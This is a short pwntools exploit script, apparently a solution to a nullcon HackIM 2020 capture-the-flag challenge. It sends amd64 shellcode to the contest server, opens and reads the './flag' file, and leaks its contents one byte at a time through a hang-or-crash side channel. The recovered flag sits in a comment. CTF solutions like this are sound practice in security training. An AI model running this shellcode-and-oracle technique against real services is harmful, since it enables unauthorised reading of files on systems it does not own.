#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

charset = '_abcdefghijklmnopqrstuvwxyz{}?0123456789$ABCDEFGHIJKLMNOPQRSTUVWXYZ'

payload = ''
payload += shellcraft.open('./flag')
payload += shellcraft.read(fd=5,buffer='rsp',count=60)
payload += '''
    cmp BYTE PTR [rsp+{}], '{}'
    jz GG
    ret

GG: jmp GG
'''

# hackim20{OMG_The_first_one_was_unintended}
flag = ''

for i in range(60):
    for c in charset:
        try:
            r = remote('pwn4.ctf.nullcon.net', 5003)
            r.send(asm(payload.format(i,c)))
            r.recvuntil('>>', timeout=5)
            r.close()
            flag += c
            break
        except EOFError:
            r.close()
    print 'FLAG:', flag


r.interactive()
